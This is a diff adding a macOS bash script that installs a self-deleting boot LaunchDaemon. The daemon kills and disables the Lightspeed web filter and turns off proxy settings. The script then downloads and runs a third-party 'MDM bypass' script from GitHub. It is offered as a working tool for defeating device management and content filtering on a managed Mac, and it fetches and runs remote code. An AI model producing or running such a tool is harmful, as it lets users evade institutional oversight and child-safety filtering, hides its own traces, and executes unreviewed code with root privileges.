@@ -1,0 +1,64 @@
+#!/bin/bash
+
+echo "=================================================="
+echo " 1. Installing Lightspeed Auto-Killer (Daemon)    "
+echo "=================================================="
+
+# Make sure the Data volume is mounted
+diskutil mount "Macintosh HD - Data" 2>/dev/null
+
+# 1. Create the script that will run on boot
+cat << 'EOF' > "/Volumes/Macintosh HD - Data/private/var/root/kill-ls.sh"
+#!/bin/bash
+# Wait 20 seconds for the Mac to fully boot and connect to Wi-Fi
+sleep 20
+
+# The exact commands that worked for you
+/usr/bin/pkill -9 lsfilter
+/usr/bin/pkill -9 mobilefilter
+/bin/launchctl bootout system /Library/LaunchDaemons/com.lightspeedsystems.lsfilter.plist
+/bin/launchctl disable system/com.lightspeedsystems.lsfilter
+/usr/sbin/networksetup -setautoproxystate "Wi-Fi" off
+/usr/sbin/networksetup -setwebproxystate "Wi-Fi" off
+/usr/sbin/networksetup -setsecurewebproxystate "Wi-Fi" off
+/usr/bin/killall -HUP configd
+/usr/bin/dscacheutil -flushcache
+/usr/bin/killall -HUP mDNSResponder
+
+# Self-Destruct
+/bin/launchctl unload /Library/LaunchDaemons/com.custom.killls.plist
+/bin/rm -f /Library/LaunchDaemons/com.custom.killls.plist
+/bin/rm -f /private/var/root/kill-ls.sh
+EOF
+
+# Make the script executable
+chmod +x "/Volumes/Macintosh HD - Data/private/var/root/kill-ls.sh"
+
+# 2. Create the LaunchDaemon that triggers the script on boot
+cat << 'EOF' > "/Volumes/Macintosh HD - Data/Library/LaunchDaemons/com.custom.killls.plist"
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.custom.killls</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>/private/var/root/kill-ls.sh</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+EOF
+
+echo "✅ Auto-Killer installed successfully."
+echo "=================================================="
+echo " 2. Running MDM Bypass (assafdori)                "
+echo "=================================================="
+
+# Download and run the MDM bypass script
+curl -sL https://raw.githubusercontent.com/assafdori/bypass-mdm/main/bypass-mdm-v2.sh -o /tmp/bypass-mdm.sh
+chmod +x /tmp/bypass-mdm.sh
+/tmp/bypass-mdm.sh
